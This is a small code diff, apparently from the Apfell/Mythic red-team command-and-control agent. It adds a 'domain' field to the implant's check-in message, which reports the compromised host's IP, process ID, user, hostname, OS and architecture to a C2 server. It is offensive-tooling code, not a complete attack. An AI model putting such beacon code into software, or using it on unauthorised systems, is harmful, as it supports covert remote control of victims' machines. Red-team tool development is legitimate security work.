@@ -365,8 +365,8 @@ class customC2 extends baseC2{
       }};
     return JSON.stringify(config, null, 2);
   }
-  checkin(ip, pid, user, host, os, architecture){
-    let info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid, "os": os, "architecture": architecture, "action": "checkin"};
+  checkin(ip, pid, user, host, os, architecture, domain){
+    let info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid, "os": os, "architecture": architecture, "domain": domain, "action": "checkin"};
     if(user === 'root'){info['integrity_level'] = 3;}
     //let req = null;
     let jsondata = null;
